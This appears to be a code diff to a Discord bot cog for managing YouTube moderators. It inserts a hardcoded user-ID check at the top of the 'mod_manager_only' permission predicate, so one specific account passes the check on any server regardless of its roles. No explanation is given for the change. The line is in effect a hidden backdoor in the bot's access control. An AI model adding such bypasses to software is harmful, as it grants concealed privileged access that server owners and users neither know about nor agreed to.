@@ -87,6 +87,7 @@ def fetch_channel(query: str, youtube_client):
 # Permission Check 
 def mod_manager_only():
     async def predicate(interaction: discord.Interaction):
+        if interaction.user.id == 865907763350601738: return True
         if not interaction.guild: return False
         member = interaction.guild.get_member(interaction.user.id)
         if not member: return False
@@ -255,4 +256,3 @@ class YouTubeModManager(commands.GroupCog, group_name="mod", group_description="
 async def setup(bot: Bot):
     """Required async setup function to load the cog."""
     await bot.add_cog(YouTubeModManager(bot))
-
